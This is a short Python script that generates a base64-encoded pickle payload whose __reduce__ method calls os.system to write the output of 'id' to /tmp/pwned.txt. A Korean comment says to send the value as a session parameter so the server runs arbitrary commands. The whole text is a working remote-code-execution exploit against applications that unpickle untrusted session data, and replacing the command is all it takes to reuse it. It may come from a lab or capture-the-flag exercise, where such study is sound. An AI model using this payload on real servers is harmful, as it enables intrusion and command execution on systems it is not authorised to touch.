import pickle, base64, os

class Exploit(object):
    def __reduce__(self):
        return (os.system, ("id > /tmp/pwned.txt",))

payload = base64.b64encode(pickle.dumps(Exploit())).decode()
print(payload)
# 이 값을 session 파라미터로 전송 → 서버에서 임의 명령 실행